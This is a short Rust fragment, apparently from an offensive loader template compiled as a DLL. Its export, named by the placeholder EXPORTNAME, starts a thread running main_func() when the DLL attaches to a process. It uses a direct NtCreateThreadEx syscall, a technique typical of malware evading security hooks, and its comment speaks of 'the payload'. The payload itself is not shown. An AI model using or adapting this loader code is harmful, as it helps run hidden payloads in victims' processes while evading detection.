#[cfg(feature = "DLL")]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
fn EXPORTNAME(
    dll_module: HINSTANCE,
    call_reason: u32,
    reserved: LPVOID)
    -> i32
{
    // recommendation is to not use DllMain for the payload due to potential LoaderLocks. If you still want to use DllMain, input arguments and return value are prepared for it.
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;
    match call_reason {
        DLL_PROCESS_ATTACH => {
            let mut threadhandle: *mut c_void = null_mut();
            let mut return_value: i32;
            unsafe {
                return_value = syscall!("NtCreateThreadEx", &mut threadhandle, 0x1FFFFF, null_mut::<c_void>(), NtCurrentProcess, main_func(), null_mut::<c_void>(), 0 as usize, 0 as usize, 0 as usize, null_mut::<c_void>());      
            }
        },
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    1 // true
}
